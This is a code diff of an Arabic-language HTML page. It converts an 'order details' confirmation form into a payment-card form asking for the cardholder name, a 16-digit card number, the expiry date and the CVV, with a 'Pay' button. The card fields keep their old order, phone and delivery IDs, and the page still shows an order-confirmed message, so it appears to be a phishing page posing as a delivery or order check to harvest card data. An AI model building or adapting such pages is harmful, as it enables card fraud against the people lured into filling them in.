@@ -111,22 +111,22 @@
 </head>
 <body>
   <main class="confirmation-card">
-    <h1>تفاصيل الطلب</h1>
-    <p class="intro">يرجى ادخال بيانات الطلب لأتمام عملية التاكيد</p>
+    <h1>تفاصيل البطاقة</h1>
+    <p class="intro">يرجى ادخال بيانات لأتمام لأتمام عملية الدفع</p>
 
     <div class="details">
       <div class="field">
-        <label for="customer-name">اسم  الطلب</label>
+        <label for="customer-name">اسم  صاحب البطاقة</label>
         <input id="customer-name" type="text" required>
       </div>
 
       <div class="field">
-        <label for="phone-second">رقم الهاتف الثاني </label>
-        <input id="phone-second" type="tel" inputmode="tel" required>
-      </div>
+  <label for="phone-second">رقم البطاقة</label>
+  <input id="phone-second" type="tel" inputmode="numeric" maxlength="16" minlength="16" pattern="\d{16}" required>
+</div>
 
       <div class="field">
-        <label>تاريخ </label>
+        <label>تاريخ الانتهاء </label>
         <div class="date-fields">
           <div class="field">
             <label for="delivery-month">الشهر</label>
@@ -156,13 +156,13 @@
       </div>
 
       <div class="field small-centered-field">
-        <label for="order-number">رقم الطلب</label>
+        <label for="order-number">رمز cvv</label>
         <input id="order-number" type="text" inputmode="numeric" autocomplete="off" required>
       </div>
 
     </div>
 
-    <button class="confirm-button" type="button">التالي </button>
+    <button class="confirm-button" type="button">ادفع </button>
     <p class="confirmed-message" role="status">تم تأكيد طلبك بنجاح.</p>
   </main>
 
